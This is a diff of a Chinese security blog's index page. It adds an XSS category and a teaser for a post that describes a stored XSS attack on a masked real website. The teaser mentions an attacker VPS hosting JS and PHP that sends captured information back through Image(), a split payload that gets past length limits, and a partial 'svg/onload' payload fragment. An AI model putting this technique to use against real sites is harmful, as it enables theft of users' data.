@@ -126,6 +126,8 @@
 				    
 				    <li><a href="/categories/Talks/" class="animsition-link">Talks<small>(2)</small></a></li>
 				    
+				    <li><a href="/categories/XSS/" class="animsition-link">XSS<small>(1)</small></a></li>
+				    
 				</ul>
         	</li>
 			
@@ -255,6 +257,44 @@
 
 <section id="intro">
     <div class="container">
+        
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2 opening-statement">
+                <div class="col-md-4">
+                    <h3><a href="/2016/07/21/XSS01/">XSS实例1</a></h3>
+                    <span>
+                        <span class="post-meta">
+      <time datetime="2016-07-20T16:57:17.000Z" itemprop="datePublished">
+          2016-07-21
+      </time>
+    
+    
+    | 
+    <a href='/tags/save/'>save</a>
+    
+    
+</span>
+                    </span>
+                </div>
+                <div class="col-md-8">
+                    <p>
+                      
+                        目标网站： http://my.xxxx.com/注：需要一个外网的vps存放写好的js文件及php文件，用于触发xss时进行加载js文件调用里边的Image()函数，将信息返回生成一个html文件！0x00注册账号：
+0x01寻找 XSS 触发点：在添加话题的地方有触发点
+0x02构造 payload 进行利用：使用拆分法：可以有效绕过长度限制！
+svg/onload=&quot;b=&#39;http://xxx&#39;&quot
+                      
+                    </p>
+                    
+                    <p class="pull-right readMore">
+                        <a href="/2016/07/21/XSS01/">Read More...</a>
+                    </p>
+                    
+                </div>
+                <div class="clearfix"></div>
+                <hr class="nogutter">
+            </div>
+        </div>
         
         <div class="row">
             <div class="col-md-8 col-md-offset-2 opening-statement">
@@ -552,48 +592,6 @@ http://127.0.0.1/sqli/Less-1/?id=1’ 报错可能存在注入http://127.0.0.1/s
                     
                     <p class="pull-right readMore">
                         <a href="/2016/05/15/TCP-IP-data-transport/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
-        </div>
-        
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2016/05/10/PHP-LEARNING/">Process Control</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2016-05-10T12:27:20.000Z" itemprop="datePublished">
-          2016-05-10
-      </time>
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        0x00前言
-   最近开始学习php，从基础的开始，一点一滴，慢慢积累。学习php要先了解一下html，css,要用到里面的标签！​
-0x01正文
-分支结构
-单一条件分支结构——&gt;if单一的条件语句
-例：
-if（$date&lt;20）{
-echo &quot;have a good day!&quot;;
-}
-双向分支结构——&gt;if else语句
-例：
-if（$date&lt;20）{
-echo &quot;have a
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2016/05/10/PHP-LEARNING/">Read More...</a>
                     </p>
                     
                 </div>
